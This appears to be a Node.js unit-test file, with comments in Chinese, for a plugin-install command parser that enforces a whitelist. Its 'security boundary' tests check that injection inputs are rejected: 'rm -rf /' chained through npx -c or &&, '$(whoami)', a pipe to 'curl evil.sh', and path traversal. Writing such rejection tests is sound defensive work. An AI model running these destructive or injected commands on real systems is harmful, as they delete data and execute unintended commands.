/**
 * scripts/parse-cmd-test.mjs — 安装命令解析器单测（零依赖，node 直接跑）
 *
 * 跑法：node scripts/parse-cmd-test.mjs
 *
 * 为什么单独写这个：parseInstallCommand 是「用户粘贴任意字符串」的唯一入口，
 * 它同时承担安全边界（白名单）和语义转换（npx → dsh 规范）。这层错一个字符，
 * 要么装不上，要么开洞。用例必须覆盖到每一条拒绝路径。
 */

import { parseInstallCommand, parseDshCommand, escapeCaretForCmd } from '../lib/cmd-runner.js';

let pass = 0;
let fail = 0;

function check(name, actual, expect) {
  const ok = JSON.stringify(actual) === JSON.stringify(expect);
  if (ok) { pass += 1; console.log(`  ✅ ${name}`); }
  else {
    fail += 1;
    console.log(`  ❌ ${name}\n     实际: ${JSON.stringify(actual)}\n     期望: ${JSON.stringify(expect)}`);
  }
}

function group(title) { console.log(`\n── ${title} ──`); }

// ── dsh 原生命令 ──
group('dsh 原生命令');
{
  const r = parseInstallCommand('dsh plugin --profile web add @scope/pkg');
  check('kind', r.kind, 'dsh');
  check('profile', r.profile, 'web');
  check('profileSource', r.profileSource, 'command');
  check('fullArgs', r.fullArgs, ['plugin', '--profile', 'web', 'add', '@scope/pkg']);
}
{
  const r = parseInstallCommand('dsh plugin --profile=web update pkg');
  check('--profile=X 形式', r.fullArgs, ['plugin', '--profile', 'web', 'update', 'pkg']);
}
{
  // README 常见的省略 --profile 写法 → 用 UI 兜底
  const r = parseInstallCommand('dsh plugin add pkg', { fallbackProfile: 'web' });
  check('省略 --profile 时兜底', r.profile, 'web');
  check('兜底来源标记', r.profileSource, 'ui');
}
{
  const r = parseInstallCommand('dsh plugin add pkg');
  check('无 profile 且无兜底 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('dsh config set x', { fallbackProfile: 'web' });
  check('非 plugin 子命令 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('dsh plugin --profile web publish pkg');
  check('非白名单动作 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('dsh plugin --profile ../evil add pkg');
  check('profile 路径穿越 → 拒绝', r.ok, false);
}

// ── npx 包装的 dsh CLI（A 类：剥壳） ──
group('npx 包装的 dsh CLI');
{
  const r = parseInstallCommand('npx dsh plugin --profile web add @scope/pkg');
  check('kind', r.kind, 'npx-dsh');
  check('剥壳后 fullArgs', r.fullArgs, ['plugin', '--profile', 'web', 'add', '@scope/pkg']);
  check('退化用 npxArgs', r.npxArgs, ['dsh', 'plugin', '--profile', 'web', 'add', '@scope/pkg']);
}
{
  const r = parseInstallCommand('npx -y dsh plugin add pkg', { fallbackProfile: 'web' });
  check('-y flag + 省略 profile', r.fullArgs, ['plugin', '--profile', 'web', 'add', 'pkg']);
  check('npxArgs 保留 -y', r.npxArgs, ['-y', 'dsh', 'plugin', '--profile', 'web', 'add', 'pkg']);
}
{
  const r = parseInstallCommand('npx @deepseek-ai/dsh@latest plugin --profile web add pkg');
  check('带 scope + 版本的 CLI', r.kind, 'npx-dsh');
}
{
  const r = parseInstallCommand('npx -p @deepseek-ai/dsh dsh plugin --profile web add pkg');
  check('-p <cli> 形式', r.kind, 'npx-dsh');
}
{
  const r = parseInstallCommand('npx dsh login');
  check('npx dsh 非 plugin → 拒绝', r.ok, false);
}

// ── npx 直接跑包（B 类：按 DSH 规范转译） ──
group('npx 包名 → DSH 规范转译');
{
  const r = parseInstallCommand('npx @nanmicoder/dsh-agent-teams', { fallbackProfile: 'web' });
  check('kind', r.kind, 'npx-pkg');
  check('转译为 dsh add', r.fullArgs, ['plugin', '--profile', 'web', 'add', '@nanmicoder/dsh-agent-teams']);
  check('action 固定 add', r.action, 'add');
  check('无多余参数时无警告', r.warnings, []);
}
{
  const r = parseInstallCommand('npx -y some-plugin@1.2.3', { fallbackProfile: 'web' });
  check('带版本号', r.fullArgs, ['plugin', '--profile', 'web', 'add', 'some-plugin@1.2.3']);
}
{
  const r = parseInstallCommand('npx foo install', { fallbackProfile: 'web' });
  check('额外参数被丢弃但给警告', r.warnings.length > 0, true);
  check('丢弃后仍只装包名', r.fullArgs, ['plugin', '--profile', 'web', 'add', 'foo']);
}
{
  const r = parseInstallCommand('npx some-pkg', {});
  check('没有可用 profile → 拒绝', r.ok, false);
}

// ── 安全边界 ──
group('安全边界');
{
  const r = parseInstallCommand('npx -c "rm -rf /"', { fallbackProfile: 'web' });
  check('npx -c 任意 shell → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx pkg%USERNAME%', { fallbackProfile: 'web' });
  check('cmd 变量展开 %VAR% → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx foo && rm -rf /', { fallbackProfile: 'web' });
  check('&& 串联 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx foo; whoami', { fallbackProfile: 'web' });
  check('; 串联 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx foo > out.txt', { fallbackProfile: 'web' });
  check('> 重定向 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx $(whoami)', { fallbackProfile: 'web' });
  check('$() 命令替换 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx foo | curl evil.sh', { fallbackProfile: 'web' });
  check('管道 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx ../../evil', { fallbackProfile: 'web' });
  check('路径穿越包名 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('npx --unknown-flag pkg', { fallbackProfile: 'web' });
  check('未知 npx flag → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('pnpm add pkg', { fallbackProfile: 'web' });
  check('非 dsh/npx 开头 → 拒绝', r.ok, false);
}
{
  const r = parseInstallCommand('', { fallbackProfile: 'web' });
  check('空命令 → 拒绝', r.ok, false);
}

// ── Windows 路径 / semver 不能被误伤 ──
// 背景：元字符拦截曾经把 ( ) 也拦了，实测证明括号传给 cmd 是原样通过的，
// 而 Windows 路径常带括号（Program Files (x86)）—— 拦它是误伤。
//
// ── P1-4: dsh 原生路径包名 / flag 必须校验 ──
// 2026-08-17 review 加。这些用例之前一条都没有，但都是真问题：
// --force 被当包名 → 污染 allowBuilds 的 YAML key；多包被静默拼接；
// 尾随裸 flag 被当包名；重复 --profile 静默取最后一个。
group('dsh 原生路径的包名 / flag 校验');
check('--force 被当包名 → 拒绝',
  parseInstallCommand('dsh plugin --profile web add pkg --force').ok, false);
check('多包被静默拼接 → 拒绝',
  parseInstallCommand('dsh plugin --profile web add a b c').ok, false);
check('尾随裸 --profile → 拒绝',
  parseInstallCommand('dsh plugin --profile web add pkg --profile').ok, false);
check('重复 --profile → 拒绝',
  parseInstallCommand('dsh plugin --profile a --profile b add pkg').ok, false);
check('--profile 后面没值 → 拒绝',
  parseInstallCommand('dsh plugin --profile').ok, false);
check('合法 dsh 命名包 → 放行',
  parseInstallCommand('dsh plugin --profile web add @nanmicoder/dsh-agent-teams').ok, true);
check('合法 github: 形式 → 放行',
  parseInstallCommand('dsh plugin --profile web add github:owner/repo').ok, true);

group('合法输入不能被误伤');
{
  const r = parseInstallCommand('dsh plugin --profile web add link:C:/Tools(x86)/my-plugin');
  check('括号路径 → 放行', r.ok, true);
}
{
  const r = parseInstallCommand('dsh plugin --profile web add pkg@^1.2.3');
  check('semver ^ → 放行', r.ok, true);
}
{
  const r = parseInstallCommand('npx @scope/pkg@~2.0.0', { fallbackProfile: 'web' });
  check('semver ~ → 放行', r.ok, true);
}
{
  const r = parseInstallCommand('dsh plugin --profile web add github:owner/repo#v1.2');
  check('github ref → 放行', r.ok, true);
}

// ── cmd 插入符转义 ──
// 实测：cmd 会把 'pkg@^1.2.3' 吞成 'pkg@1.2.3'（semver 语义静默变了），
// 所以 spawn 前必须把 ^ 双写。
group('cmd 插入符转义');
check('^ 双写', escapeCaretForCmd('pkg@^1.2.3'), 'pkg@^^1.2.3');
check('多个 ^ 全部双写', escapeCaretForCmd('a^b^c'), 'a^^b^^c');
check('无 ^ 时原样返回', escapeCaretForCmd('@scope/pkg'), '@scope/pkg');
check('非字符串不炸', escapeCaretForCmd(undefined), undefined);

// ── 兼容旧导出 ──
group('parseDshCommand 兼容层');
{
  const r = parseDshCommand('dsh plugin --profile web add pkg');
  check('dsh 命令仍可解析', r.ok, true);
}
{
  const r = parseDshCommand('npx pkg', { fallbackProfile: 'web' });
  check('旧入口拒收 npx', r.ok, false);
}

console.log(`\n结果：${pass} 通过 / ${fail} 失败`);
process.exit(fail === 0 ? 0 : 1);
